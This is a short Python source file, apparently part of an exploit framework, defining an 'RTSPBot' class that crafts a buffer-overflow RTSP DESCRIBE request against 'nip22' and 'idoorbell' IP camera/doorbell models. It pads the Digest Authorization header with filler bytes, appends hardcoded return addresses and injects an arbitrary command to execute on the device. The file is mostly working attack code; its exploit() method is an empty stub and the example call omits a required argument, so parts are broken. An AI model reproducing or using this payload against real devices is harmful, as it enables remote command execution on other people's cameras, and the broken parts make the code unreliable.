import os, time, sys, URLFunctions
from ExploitBot import ExploitBot


class RTSPBot(ExploitBot):

    def __init__(self, dbURL, webURL, hardwareModel):

        super(RTSPBot, self).__init__(dbURL, webURL)

        self.__hardwareModel = hardwareModel
        self._modelPassword = ""
        self._targetIP = ExploitBot.getTarget(self)
        self._targetURL = ""
        self._targetField = "A" * 296
        self._targetUsername = "A" * 548

    def prepare_target(self, _model, _cmdToExecute):

        self._targetField += _cmdToExecute

        if _model == "nip22":
            self._targetUsername += "\x64\x7B\x08"

        elif _model == "idoorbell":
            self._targetUsername += "\xD8\xED\x07"

        self._targetURL = "DESCRIBE rtsp://%s:554/ RTSP/1.0\r\nCSEQ: 1\r\nAuthorization: Digest %s=\"%s\"\r\n\r\n""" \
                          % (self._targetIP, self._targetField, self._targetUsername)

    def exploit(self):

        if self._targetURL != "":
            "Executing Target Now..."
        else:
            "Before executing, make sure to prepare target first..."


if __name__ == "__main__":
    hello = RTSPBot(dbURL="1.2.3.4", webURL="4.5.6.7")